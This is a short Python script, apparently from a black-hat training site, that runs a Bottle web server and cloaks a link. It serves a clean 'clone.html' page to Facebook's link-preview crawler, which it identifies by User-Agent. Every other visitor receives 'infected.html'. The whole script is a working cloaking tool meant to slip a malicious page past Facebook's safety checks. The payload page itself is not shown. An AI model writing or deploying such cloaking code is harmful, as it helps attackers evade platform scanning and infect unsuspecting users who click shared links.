## www.kirkdurbin.com
## www.blackhatacademy.org

try:
	from bottle import *
except ImportError:
	print "Bottle not installed!"
	sys.exit(0)

@route('/<filepath:path>')

def serve(filepath):
	user_agent = request.headers.get('User-Agent')
	fbook_ua = "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"

	print user_agent

	if user_agent == str(fbook_ua):
		return static_file('clone.html', root='tmp')
	else:
		return static_file('infected.html', root='tmp')


run(host='0.0.0.0', port=80)
